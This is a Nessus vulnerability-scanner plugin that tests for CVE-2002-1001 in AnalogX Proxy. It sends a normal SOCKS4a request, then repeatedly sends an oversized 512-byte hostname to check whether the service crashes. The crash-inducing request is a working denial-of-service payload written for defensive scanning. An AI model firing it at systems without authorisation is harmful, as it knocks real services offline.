#
# (C) Tenable Network Security, Inc.
# 

# Script audit and contributions from Carmichael Security
#      Erik Anderson <eanders@carmichaelsecurity.com> (nb: domain no longer exists)
#      Added BugtraqID and CAN
#
# References:
# Subject: Foundstone Advisory - Buffer Overflow in AnalogX Proxy
# Date: Mon, 1 Jul 2002 14:37:44 -0700
# From: "Foundstone Labs" <labs@foundstone.com>
# To: <da@securityfocus.com>
#
# Vulnerable:
# AnalogX Proxy v4.07 and previous

include("compat.inc");

if(description)
{
 script_id(11126);
 script_version ("$Revision: 1.22 $");

 script_cve_id("CVE-2002-1001");
 script_bugtraq_id(5138, 5139);
 script_osvdb_id(3662);

 script_name(english:"AnalogX Proxy SOCKS4a DNS Hostname Handling Remote Overflow");
 
 script_set_attribute(
  attribute:"synopsis",
  value:"The remote SOCKS service is prone to a buffer overflow attack."
 );
 script_set_attribute(attribute:"description", value:
"The SOCKS4a service running on the remote host crashes when it receives
a request with a long hostname.  An attacker may be able to leverage
this issue to disable the remote service or even execute arbitrary
code on the affected host." );
 script_set_attribute(
  attribute:"solution", 
  value:"Contact the vendor for a fix."
 );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2002/09/21");
 script_set_attribute(attribute:"vuln_publication_date", value: "2002/07/01");
 script_cvs_date("$Date: 2012/06/20 13:48:44 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_summary(english:"Too long hostname kills the SOCKS4A server");
 script_category(ACT_DENIAL);
 script_copyright(english:"This script is Copyright (C) 2002-2012 Tenable Network Security, Inc.");
 script_family(english:"Firewalls");
 script_require_ports("Services/socks4", 1080);
 script_dependencie("find_service1.nasl");
 exit(0);
}

include("audit.inc");
include("byte_func.inc");
include("global_settings.inc");
include("misc_func.inc");

function mkreq(host, port, user)
{
  # Create a connection request.
  return
    raw_string(4) +          # Protocol version
    raw_string(1) +          # Command code to establish a stream conneciton
    mkword(port) +           # Port to connect to
    raw_string(0, 0, 0, 1) + # Bogus IP address
    user + raw_string(0) +   # User ID
    host + raw_string(0);    # Hostname to connect to
}

rport = 8080;
timeout = 30;

port = get_service(svc:"socks4", default:1080, exit_on_fail:TRUE);
if (!get_port_state(port)) audit(AUDIT_PORT_CLOSED, port);

# All parameters in SOCKS4a are big-endian.
set_byte_order(BYTE_ORDER_BIG_ENDIAN);

# Create a benign connection request and send it.
req = mkreq(host:"example.com", port:rport, user:"nessus");

soc = open_sock_tcp(port);
if (!soc) audit(AUDIT_PORT_CLOSED, port);
send(socket:soc, data:req);
res = recv(socket:soc, length:8, timeout:timeout);
close(soc);

# Confirm that the target responded.
if (!res) audit(AUDIT_RESP_NOT, port);

# Confirm that the response is in the expected format.
status = getbyte(blob:res, pos:1);
if (
  strlen(res) != 8 ||
  getbyte(blob:res, pos:0) != 0x00 ||
  status < 0x5A ||
  status > 0x5D ||
  getword(blob:res, pos:2) != rport
) audit(AUDIT_RESP_BAD, port);

# 140 bytes are enough for AnalogX overflow, but we'll do more to be
# sure.
req = mkreq(host:crap(512), port:rport, user:"nessus");

# Check if we can crash the service.
alive = TRUE;
for (i = 0; alive && i < 6; i++)
{
  soc = open_sock_tcp(port);
  if (!soc) audit(AUDIT_PORT_CLOSED, port);
  send(socket:soc, data:req);
  res = recv(socket:soc, length:8, timeout:timeout);
  close(soc);

  soc = open_sock_tcp(port);
  if (!soc)
    alive = (service_is_dead(port: port) <= 0);
  close(soc);
}

if (alive)
  audit(AUDIT_LISTEN_NOT_VULN, "SOCKS4a", port);

security_hole(port);
